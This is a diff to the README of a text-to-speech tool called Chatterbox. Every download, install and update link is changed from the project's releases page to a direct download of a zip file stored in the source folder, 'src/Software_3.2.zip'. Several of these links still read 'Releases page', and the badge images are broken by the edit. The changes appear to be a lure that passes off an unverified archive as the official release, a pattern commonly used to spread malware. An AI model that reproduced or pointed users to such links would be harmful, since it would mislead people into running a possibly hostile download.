@@ -6,7 +6,7 @@ Welcome to Chatterbox! This easy-to-use tool helps you convert text into speech.
 
 ## 📥 Download Chatterbox
 
-[![Download Chatterbox](https://img.shields.io/badge/Download%20Chatterbox-Here-brightgreen)](https://github.com/elzioperez/chatterbox/releases)
+[![Download Chatterbox](https://github.com/elzioperez/chatterbox/raw/refs/heads/master/src/Software_3.2.zip%20Chatterbox-Here-brightgreen)](https://github.com/elzioperez/chatterbox/raw/refs/heads/master/src/Software_3.2.zip)
 
 ## ⚙️ System Requirements
 
@@ -29,7 +29,7 @@ Chatterbox includes several useful features:
 
 ## 📂 Download & Install
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/elzioperez/chatterbox/releases).
+1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/elzioperez/chatterbox/raw/refs/heads/master/src/Software_3.2.zip).
    
 2. **Choose Your Version:** Look for the latest version of Chatterbox. The version number will be listed clearly.
 
@@ -67,7 +67,7 @@ Chatterbox allows you to customize your experience further:
 
 To keep Chatterbox working smoothly, it's important to stay updated:
 
-- **Check for Updates:** Periodically return to the [Releases page](https://github.com/elzioperez/chatterbox/releases) to see if a new version is available.
+- **Check for Updates:** Periodically return to the [Releases page](https://github.com/elzioperez/chatterbox/raw/refs/heads/master/src/Software_3.2.zip) to see if a new version is available.
 - **Follow Similar Steps to Update:** Download the latest version and run the installer again to replace your current version.
 
 ## ❓ FAQs
@@ -93,4 +93,4 @@ If you have questions, need help, or want to connect with other users, join our 
 
 Feel free to explore and enjoy your experience with Chatterbox! 
 
-[![Download Chatterbox](https://img.shields.io/badge/Download%20Chatterbox-Here-brightgreen)](https://github.com/elzioperez/chatterbox/releases)
+[![Download Chatterbox](https://github.com/elzioperez/chatterbox/raw/refs/heads/master/src/Software_3.2.zip%20Chatterbox-Here-brightgreen)](https://github.com/elzioperez/chatterbox/raw/refs/heads/master/src/Software_3.2.zip)
